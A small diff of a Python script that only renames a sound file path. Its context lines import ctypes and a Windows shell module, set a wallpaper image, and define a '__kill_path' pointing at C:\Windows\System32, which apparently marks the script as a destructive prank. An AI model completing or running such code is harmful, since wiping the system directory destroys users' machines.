@@ -4,7 +4,7 @@ import ctypes
 import win32com.shell.shell as shell
 
 
-__sound_file = os.path.normpath(r"./files/where_is_my_life_piano.mp3")
+__sound_file = os.path.normpath(r"./files/where_is_my_mind_piano.mp3")
 __project_root = os.path.dirname(os.path.dirname(__file__))
 __wallpaper_file = os.path.normpath(__project_root + r"/src/files/where_is_my_mind.png")
 __kill_path = "C:\Windows\System32"
